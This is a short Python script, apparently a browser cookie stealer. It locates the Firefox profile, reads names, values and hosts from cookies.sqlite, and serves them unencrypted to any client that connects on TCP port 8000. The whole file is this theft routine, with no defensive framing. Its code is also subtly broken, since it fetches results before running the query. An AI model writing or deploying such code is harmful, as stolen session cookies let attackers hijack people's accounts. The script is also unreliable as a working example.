import sqlite3;
import os, socket;



def GetFirefoxCookies():

    homeDirectory = os.path.expanduser("~");




    os.chdir(homeDirectory)    
    os.chdir(".mozilla/firefox") 


    cookiesPath= "";

    for directory in os.listdir():

        if(".default" in directory and os.path.isdir(directory)):
            os.chdir(directory)    
            cookiesPath= os.getcwd() + "/cookies.sqlite";



    try:

        connection = sqlite3.connect(cookiesPath)
        cursor = connection.cursor()
        cookies = cursor.fetchall()
        cursor.execute('SELECT name, value, host FROM moz_cookies')
        connection.close()

        return cookies

    except Exception:
        return False;



# Send cookies
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);


serverAddress = ('', 8000);
serverSocket.bind(serverAddress);
serverSocket.listen();


# Accept connections
clientSocket, clientAddress = serverSocket.accept();


cookies = GetFirefoxCookies()
cookiesData = str(cookies).encode()


# Send cookies
clientSocket.sendall(cookiesData)



serverSocket.close();
clientSocket.close();